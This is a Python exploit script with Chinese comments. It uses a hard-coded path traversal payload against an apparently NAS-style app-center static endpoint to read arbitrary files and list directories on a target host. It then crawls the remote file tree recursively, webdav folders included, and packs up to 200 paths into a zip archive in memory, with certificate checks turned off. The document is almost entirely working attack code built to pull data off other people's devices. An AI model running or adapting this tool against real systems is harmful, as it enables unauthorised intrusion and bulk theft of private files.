import requests
import zipfile
import io
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, unquote

# 核心 Payload
PAYLOAD = "/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../"


def get_remote_content(base_url, path):
    """获取指定路径的内容，返回解析后的文件/文件夹列表"""
    # 构造完整攻击链接
    # 注意：path 必须以 / 结尾才能正确列出目录，如果是文件则不需要
    if not path.startswith('/'):
        path = '/' + path

    target_url = f"{base_url.rstrip('/')}{PAYLOAD}{path.lstrip('/')}"

    try:
        resp = requests.get(target_url, verify=False, timeout=10)

        # 判断是文件内容还是目录列表
        content_type = resp.headers.get('Content-Type', '')

        # 简单判断：如果不是 text/html，大概率是文件下载（或者图片预览）
        if 'text/html' not in content_type:
            return {
                'type': 'file',
                'content': resp.content,
                'mimetype': content_type
            }

        # 如果是目录，解析 HTML
        soup = BeautifulSoup(resp.text, 'html.parser')
        items = []

        # 检查当前路径是否在 webdav 目录下
        is_webdav_path = '/webdav/' in path.lower() or path.lower().endswith('/webdav')

        for a in soup.find_all('a'):
            href = a.get('href')
            text = a.text.strip()

            # 过滤掉无用的链接
            if href in ['../', './', 'size=../../../../', '../']:
                continue

            # 判断是否为文件夹
            is_dir = False
            
            if href.endswith('/') or text.endswith('/'):
                # 明确以 / 结尾，是目录
                is_dir = True
            elif is_webdav_path:
                # 在 webdav 目录下，检查是否有明确的文件扩展名
                name_part = href.split('/')[-1]
                if '.' in name_part:
                    # 有点号，检查扩展名
                    ext = name_part.split('.')[-1].lower()
                    # 常见文件扩展名列表
                    common_file_exts = [
                        'txt', 'log', 'conf', 'cfg', 'ini', 'xml', 'json', 'html', 'css', 'js', 
                        'jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'webp', 'ico',
                        'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
                        'zip', 'rar', 'tar', 'gz', '7z',
                        'mp3', 'mp4', 'avi', 'mkv', 'wav',
                        'sh', 'py', 'java', 'c', 'cpp', 'h', 'go', 'rs',
                        'md', 'yml', 'yaml', 'toml'
                    ]
                    if ext in common_file_exts:
                        is_dir = False
                    else:
                        # 不常见的扩展名或者点号在开头（如 .config），认为是目录
                        is_dir = True
                else:
                    # webdav 下没有扩展名，认为是目录
                    is_dir = True
            else:
                # 非 webdav 路径，保持原有逻辑：只有以 / 结尾才是目录
                is_dir = False

            items.append({
                'name': text,
                'href': href,
                'is_dir': is_dir
            })

        return {
            'type': 'directory',
            'items': items,
            'current_path': path
        }

    except Exception as e:
        return {'type': 'error', 'msg': str(e)}


def recursive_zip_download(base_url, start_path):
    """
    递归下载文件夹并打包成 Zip
    注意：为了防止死循环和过大，建议设置深度限制
    """
    memory_file = io.BytesIO()

    # 记录已访问的路径防止循环
    visited = set()

    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 待处理队列：(current_remote_path, zip_internal_path)
        queue = [(start_path, start_path.strip('/'))]

        while queue:
            curr_remote, curr_zip_path = queue.pop(0)

            if curr_remote in visited: continue
            visited.add(curr_remote)

            # 获取当前目录内容
            data = get_remote_content(base_url, curr_remote)

            if data['type'] == 'directory':
                for item in data['items']:
                    # 拼接远程路径
                    next_remote = os.path.join(curr_remote, item['href']).replace('\\', '/')
                    # 拼接 ZIP 内部路径
                    next_zip = os.path.join(curr_zip_path, item['name']).replace('\\', '/')

                    if item['is_dir']:
                        # 去除尾部斜杠避免路径重复
                        next_remote_clean = next_remote.rstrip('/')
                        queue.append((next_remote_clean, next_zip))
                    else:
                        # 是文件，直接下载并写入 ZIP
                        try:
                            file_data = get_remote_content(base_url, next_remote)
                            if file_data['type'] == 'file':
                                zf.writestr(next_zip, file_data['content'])
                        except Exception as e:
                            print(f"Failed to download {next_remote}: {e}")
                            pass  # 忽略下载错误的文件

            # 简单的防爆破限制：如果文件太多可在此 break
            if len(visited) > 200:
                break

    memory_file.seek(0)
    return memory_file